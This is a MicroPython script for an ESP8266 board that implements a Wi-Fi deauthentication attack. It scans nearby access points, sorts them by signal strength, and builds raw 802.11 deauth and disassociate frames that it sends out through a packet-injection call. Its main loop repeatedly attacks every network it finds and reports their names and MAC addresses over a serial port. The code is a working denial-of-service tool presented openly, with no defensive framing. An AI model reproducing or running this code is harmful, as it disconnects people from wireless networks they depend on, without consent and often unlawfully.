import time
import network
import wireless
import ubinascii
from machine import UART
from machine import Pin

class WifiAttack(object):

    def __init__(self):
        self._client = [0xFF,0xFF,0xFF,0xFF,0xFF,0xFF]
        self.ssid    = ''
        self.bssid   = ''
        self.channel = ''
        pass

    def sta_open(self):
        self.sta_if = wireless.attack(0)  #0：STA 模式 1：AP模式
        self.sta_if.active(True)  # 激活网卡

    def sta_scan(self):
        self.ap_list = self.sta_if.scan()

    def sta_wifi(self):
        self.ap_list = self.orderRSSI(self.ap_list,3,1)
        for i in range(len(self.ap_list)):
            print(i,'-',self.ap_list[i][0].decode(),
                ' -CHANNEL:',self.ap_list[i][2],
                ' -RSSI:',self.ap_list[i][3])

    def deauth(self,_ap,_client,type,reason):
        # 0 - 1   type, subtype c0: deauth (a0: disassociate)
        # 2 - 3   duration (SDK takes care of that)
        # 4 - 9   reciever (target)
        # 10 - 15 source (ap)
        # 16 - 21 BSSID (ap)
        # 22 - 23 fragment & squence number
        # 24 - 25 reason code (1 = unspecified reason)
        inita = [
            0xC0,0x00,
            0x00,0x00,
            0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,
            0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,
            0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,
            0x00,0x00,
            0x01,0x00
        ]

        initb = [
            0xC0,0x00,
            0x00,0x00,
            0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
            0xD4,0xEE,0x07,0x42,0x00,0x5A,
            0xA4,0xAE,0x32,0x22,0x20,0xAA,
            0x00,0x00,
            0x01,0x00
        ]
        
        packet = bytearray(initb)
        for i in range(0,6):
            packet[4 + i] =_client[i]
            packet[10 + i] = packet[16 + i] =_ap[i]
        #set type
        packet[0] = type;
        packet[24] = reason
        result = self.sta_if.send_pkt_freedom(packet)
        if result==0:
            time.sleep_ms(1)
            return True
        else:
            return False

    # 按信号排序
    # index 索引值
    # order 0降序 1升序
    def orderRSSI(self,nums,index=3,order=1):
        for i in range(len(nums)-1):
            for j in range(len(nums)-i-1):
                if order == 1:
                    if nums[j][index] < nums[j+1][index]:
                        nums[j],nums[j+1] = nums[j+1], nums[j]
                else:
                    if nums[j][index] > nums[j+1][index]:
                        nums[j],nums[j+1] = nums[j+1], nums[j]
        return nums
    
    # index 攻击索引，默认第一个
    # sendNum 攻击次数
    def attack(self,index=0,sendNum=5000):
        ssid = self.ap_list[index][0]
        bssid = self.ap_list[index][1]
        channel = self.ap_list[index][2]
        print('-Wifi------')
        print('-ssid:',ssid)
        print('-bssid:',bssid)
        print('-channel:',channel)
        print('----------------')
        print('******************************')
        if self.sta_if.setAttack(channel):
            print('Set Attack OK')
            time.sleep_ms(100)
            print('---deauth runing-----')
            for i in range(0,sendNum):         
                r_= self.deauth(bssid, self._client, 0xC0, 0x01)
                if r_:
                    
                    # self.deauth(self._client, bssid, 0xA0, 0x01)   # 新的       
                    self.deauth(bssid, self._client, 0xA0, 0x01) # 旧的

                    self.deauth(self._client, bssid, 0xC0, 0x01)
                    self.deauth(self._client, bssid, 0xA0, 0x01)
                    time.sleep_ms(5)
                else:
                    print('---deauth fail-------')
                print('-times:',i+1)
                # time.sleep_ms(1500)   # 延迟一下


p = Pin(2,Pin.OUT,value=1)
def blink(times=1):
    global p
    for i in range(times):
        p.value(0)
        time.sleep(0.15)
        p.value(1)
        time.sleep(0.15)


if __name__=="__main__":
    
    u = UART(0,115200)
    sta = WifiAttack()
    sta.sta_open()
    while True:
        sta.sta_scan()
        time.sleep(5)
        blink(3)
        count = 0
        for i in sta.ap_list:    
            mac = ubinascii.hexlify(i[1])
            mac = mac.decode('utf-8')

            u.write(i[0] + ',' + str(i[2]) + ',' + mac)
            blink(2)
            sta.attack(count,2000)
            count = count + 1
            # time.sleep(10)

    # while True:
    #     data = u.read()
    #     if data != None:
    #         blink(2)
    #         u.write('recv:'+data.decode('utf-8'))

    # sta = WifiAttack()
    # sta.sta_open()
    # sta.sta_scan()
    # sta.sta_wifi()
    # sta.attack(0)

    # 编译 esp8266 开启 wireless 的包，引出，问了大神 + 论坛，可能要自己编译下
    # ↑ 考虑用 Nodemcu(lua) 或 adruino 固件
    # esp8266 12 引脚加ipex -> 考虑用07S代替